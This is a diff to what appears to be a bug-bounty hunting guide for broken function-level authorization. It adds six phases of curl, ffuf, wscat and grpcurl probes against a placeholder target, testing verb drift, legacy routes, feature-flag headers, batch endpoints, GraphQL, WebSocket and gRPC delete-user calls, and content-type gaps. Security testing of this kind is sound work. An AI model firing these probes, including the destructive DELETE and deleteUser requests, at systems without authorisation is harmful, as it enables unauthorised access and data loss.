@@ -475,6 +475,107 @@ app.post('/api/admin/delete', deleteUser);         // no server-side check
 
 **Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.
 
+### Function-Level Probe Set (merged from hunt-broken-function-level-auth)
+
+Replay every privileged endpoint from a regular session and from no session; a differential against the 403 its siblings return is the finding.
+
+### Phase 1 — HTTP Verb Drift
+
+```bash
+# Admin endpoints — each HTTP method may have different auth
+ENDPOINTS=(
+  "/api/admin/users"
+  "/api/admin/settings"
+  "/api/manage/orders"
+  "/api/internal/config"
+)
+
+for ep in "${ENDPOINTS[@]}"; do
+  for method in GET POST PUT PATCH DELETE; do
+    curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com$ep" \
+      -w "$method $ep — %{http_code}\n" -o /dev/null
+  done
+  # Also try custom methods
+  curl --max-time 30 --connect-timeout 10 -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
+  curl --max-time 30 --connect-timeout 10 -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
+done
+```
+
+### Phase 2 — Route Shadowing
+
+```bash
+# Legacy routes that bypass modern middleware
+for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
+            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
+done
+
+# ffuf for route discovery
+ffuf -u "https://target.com/api/FUZZ/users" \
+  -w /path/to/prefixes.txt \
+  -mc 200,301,401,403
+```
+
+### Phase 3 — Feature Flag Bypass
+
+```bash
+# Beta/preview endpoints often lack authorization
+for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
+done
+
+# Feature flags in headers or cookies
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "X-Feature-Flags: admin" \
+  -H "X-Experimental: true" \
+  -H "X-Beta-Access: 1"
+```
+
+### Phase 4 — Batch & Job Endpoints
+
+```bash
+# Batch operations may skip per-item authorization
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/batch" \
+  -H "Content-Type: application/json" \
+  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'
+
+# Background job endpoints
+for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
+done
+```
+
+### Phase 5 — Transport Protocol Inconsistency
+
+```bash
+# GraphQL — check if mutations allow admin actions without role check
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'
+
+# WebSocket — actions sent over WS may skip REST middleware
+# Test via wscat
+echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"
+
+# gRPC — reflection may expose admin methods
+grpcurl -plaintext target.com:50051 list
+grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
+```
+
+### Phase 6 — Content-Type Middleware Gaps
+
+```bash
+# Different content types may hit different parsers/middleware
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "Accept: application/xml" \
+  -H "Content-Type: application/xml" \
+  -d '<user><name>test</name></user>'
+
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "Content-Type: multipart/form-data" \
+  -F "name=test"
+```
+
 ---
 
 ## Verification
